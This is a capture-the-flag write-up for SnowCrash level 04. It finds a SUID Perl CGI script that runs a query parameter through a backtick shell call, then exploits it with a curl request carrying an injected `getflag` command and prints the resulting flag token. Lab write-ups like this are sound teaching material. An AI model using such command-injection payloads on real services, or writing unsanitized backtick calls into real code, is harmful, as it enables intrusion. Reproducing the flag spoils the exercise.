# Level 04 - Command Injection via Perl CGI Script

In this level, we discover and exploit a Perl CGI script running locally that improperly handles input and executes it without sanitization, allowing for command injection.

---

## Step 1: Inspect the Home Directory

```bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

We see a **SUID Perl script**:

```bash
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

---

## Step 2: Read the Script

```bash
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

This script is a basic CGI program that:

- Uses `param("x")` to retrieve a GET parameter
- Executes it inside a backtick call: `` `echo $y` ``

This is a classic **unsanitized input** leading to **command injection**.

---

## Step 3: Exploit via `curl`

```bash
curl 'localhost:4747?x=`getflag`'
```

Output:

```bash
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

## ✅ Summary

- Vulnerable Perl CGI script executes unsanitized user input.
- Injected a backtick command to execute `getflag`.
- Successfully escalated privileges.

### Flag Token:

```text
ne2searoevaevoem4ov4ar8ap
```

Quick and powerful example of web-based command injection.
